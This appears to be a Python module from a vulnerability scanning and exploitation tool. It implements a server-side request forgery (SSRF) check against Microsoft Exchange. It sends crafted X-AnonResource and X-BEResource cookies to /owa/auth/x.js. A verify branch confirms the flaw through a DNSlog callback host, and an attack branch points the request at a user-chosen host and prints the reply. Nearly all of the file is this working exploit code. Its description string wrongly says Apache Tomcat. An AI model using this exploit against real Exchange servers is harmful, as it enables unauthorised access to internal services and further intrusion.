from util.ExpRequest import ExpRequest, Output
from ClassCongregation import Dnslog
from operator import methodcaller
"""
Exchange_SSRF  [ssrf]
"""
class Exchange():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')

    def Exchange_SSRF(self):
        appName = 'Exchange:Exchange_SSRF'
        pocname = 'Exchange_SSRF'
        path = '/owa/auth/x.js'
        method = 'get'
        desc = 'Apache Tomcat: Examples File'
        info = "[ssrf]"
        payload = ''
        cookie = 'X-AnonResource=true;X-AnonResource-Backend={}/ecp/default.flt?~3;X-BEResource={}/owa/auth/logon.aspx?~3;'
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            #_verify
            if self.vuln == 'False':
                dnslog = Dnslog()
                exprequest.get(self.url + path, data=payload, headers={'Cookie':cookie.format(dnslog.dns_host(), dnslog.dns_host())}, timeout=self.timeout, verify=False)
                if dnslog.result():
                    output.echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
            else:
                request = exprequest.get(self.url + path, data=payload, headers={'Cookie':cookie.format(self.cmd, self.cmd)}, timeout=self.timeout, verify=False)
                print(request.text)
        except Exception as error:
                output.error_output(str(error))

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpExchange = Exchange(**kwargs)
    if kwargs['pocname'] != "ALL":
        func = getattr(ExpExchange, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpExchange.status
    else:#调用所有函数
        for func in dir(Exchange):
            if not func.startswith("__"):
                methodcaller(func)(ExpExchange)
                result_list.append(func+' -> '+ExpExchange.status)
                ExpExchange.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)
